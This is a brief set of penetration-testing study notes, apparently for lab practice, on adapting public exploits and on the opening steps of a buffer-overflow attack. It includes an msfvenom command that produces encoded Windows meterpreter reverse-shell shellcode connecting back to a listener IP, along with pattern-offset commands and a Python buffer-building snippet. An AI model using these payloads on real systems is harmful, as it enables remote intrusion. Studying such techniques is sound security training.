# Editing Exploits

We often find exploits that do not work out of the box. Typical problems we encounter are:

* Payload needs to be changed
* Return-address is incorrect

We can generate our own shellcode to replace the default code in the exploit fairly easily using msfvenom.

```text
# Ex. exploit code was written in python for windows exploit
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.120 LPORT=443 -f py -e x86/shikata_ga_nai -i 3 -v shellcode
```

{% hint style="info" %}
It is generally best practice to keep the shellcode the same length as the original for compatability.

* Tip: Try to make your new payload smaller and fill the beginning with extra NOPs to make it the same size.
{% endhint %}

## Buffer Overflows

### 1. Fuzzing

Send Strings of increasing length to the vulnerable parameter in the service

### 2. Finding EIP with Pattern

`$ msf-pattern_create -l <size>`   \* Length that crashed the application

`$ msf-pattern_offset -l <size> -q <eip-crash-value>`

Using the EIP offset found, create a poc to check the offset is correct and reliable

```text
# in python script
eip = '\xef\xbe\xad\xde'
buffer = "A" * <length offset> + eip + "C" * (<total-length> - <offset> - 4)
```

### 3. Finding Bad Characters



